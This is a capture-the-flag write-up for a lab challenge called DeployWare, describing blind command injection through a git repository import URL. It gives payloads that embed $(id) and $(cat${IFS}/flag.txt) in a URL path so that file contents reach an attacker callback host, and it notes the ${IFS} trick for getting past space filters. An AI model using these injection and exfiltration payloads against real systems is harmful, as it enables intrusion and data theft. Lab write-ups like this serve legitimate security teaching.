---
title: "Webverselabs DeployWare Challenge Command Injection "
date: 2026-06-09 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Hard , Challenge , Web_Attacks ]
---


## Scenario : 

DeployWare is a GitOps platform that lets teams connect repositories and automate deployments. The Repo Import feature lets users submit a git URL for DeployWare to clone and analyse. The URL is written to a job queue and processed by a background worker that runs every 30 seconds. Nothing executes at submission time, and the import form gives no feedback beyond "job queued." The worker that processes it is running a construction that hasn't been reviewed in months.

## Solution : 


<img width="1655" height="833" alt="image" src="https://github.com/user-attachments/assets/08658be8-c899-461f-9898-4e5a0347580f" />

First look at the application, we see that this is an app that helps when it comes to deploying apps and managing Repos. 

**/Products , /Config , /Integrations , /Pricing , /Docs** : All just returns static pages describing the product, nothing useful to us. 

We first create an account to explore the app. 

<img width="1114" height="759" alt="image" src="https://github.com/user-attachments/assets/e88690e3-2a3f-4bc6-a5d1-95baf01b61e9" />

Once we login , we find a list of Projects as well as additional endpoints we can enumerate : 

<img width="1896" height="628" alt="image" src="https://github.com/user-attachments/assets/0dbea15a-28c0-461a-a761-85b164b2634f" />

One thing to note is the Import Repo feature , this is probably the way in, but first let's visit all the endpoints to be sure.

**/Deployment :**

<img width="1619" height="738" alt="image" src="https://github.com/user-attachments/assets/ba44ada8-2826-4161-84aa-266b8bd1496e" />

A list of Recent deployed projects, just a static page, nothing useful . 

**/Pipelines :**

<img width="1639" height="702" alt="image" src="https://github.com/user-attachments/assets/b60b095b-202b-414c-ba93-60dedc1f653e" />

Again nothing useful here , just a static page containing different pipelines . 

**/Settings :**

<img width="1089" height="661" alt="image" src="https://github.com/user-attachments/assets/28c13d6d-ffe3-457c-a962-d09adc05f201" />

Obviously the settings are pretty much useful to us as well . 

**/Repos :**

<img width="1905" height="427" alt="image" src="https://github.com/user-attachments/assets/eefed667-02b0-43be-8589-f3336a6f4adf" />

Here we have the possibility to import Repositories . 

<img width="889" height="492" alt="image" src="https://github.com/user-attachments/assets/47d367db-5cdd-4bf9-adf1-0ebebd6de9a9" />

Now first thing i did was import our the URL given to us by Webverslabs server to see if we get a call back . 

<img width="1919" height="297" alt="image" src="https://github.com/user-attachments/assets/65aa6177-86d6-494f-bd11-48e4042c0661" />

Once we import it : 

<img width="1553" height="304" alt="image" src="https://github.com/user-attachments/assets/7e33384d-537a-4ebf-a276-bab7f7ae65d5" />

Let's check our server to see if we get a callback :

<img width="1743" height="757" alt="image" src="https://github.com/user-attachments/assets/1dc19a82-4aef-4d03-baa4-bda99342b365" />

We do , and we see that the query made to our is : service=git-upload-pack .

Few assumptions here , the server is running a git command in the backend , so we can try to inject other commands to see we the server runs them as well . I tried a bunch of commands injection payloads : 

<img width="1474" height="565" alt="image" src="https://github.com/user-attachments/assets/f7fbe92b-87e7-41fe-892d-6f4f75d17b79" />

At first i assumed we're inside a doube quote or one quote so i tried escaping it first before adding our injection payloads but that didn't work either . 

Now assuming this is the command ran by the server : 

```bash
/bin/bash -c "git clone $url" 
```

If we are in a double quote we can try to add our command like this : $(id) since this will execute id even if we are inside a "" so it will become something like this :  

```bash
/bin/bash -c "git clone $url $(id)" 
```

<img width="962" height="621" alt="image" src="https://github.com/user-attachments/assets/83443cba-6916-488b-8814-a932c8f4ea28" />

Didn't work either , but looking at our Server , we see that if we do that we don't even get a callback ; makes sense since we're not calling the correct URL if we are adding $(id) to it . 

Then i tried adding it like a directory this way it will call back our server and attempt to access the $(id) file which will execute the command instead : 

```bash
/bin/bash -c "git clone $url" 

But here the URL is :
http://3e6a2fa6-4327-deployware-9c752.interact.webverselabs-pro.com/$(id) 
```

<img width="1876" height="731" alt="image" src="https://github.com/user-attachments/assets/f179ef5a-8821-456c-b415-48b21d40e058" />

This works perfectly , now we can just read the flag using the same method , ofc if we have an issue with space filters just use ${IFS} to bypass it : 

```bash
http://3e6a2fa6-4327-deployware-9c752.interact.webverselabs-pro.com/$(cat${IFS}/flag.txt) 
```
<img width="1352" height="715" alt="image" src="https://github.com/user-attachments/assets/c9edcd59-58b6-46b3-89c7-c1c02622a85e" />

Now Once the server imports this URL , we should get our call back with the flag . 

<img width="1917" height="821" alt="image" src="https://github.com/user-attachments/assets/80ac2e67-c5b8-423e-9f62-bee1aa58cd18" />

That was all for this challenge. See you in the next one :) 

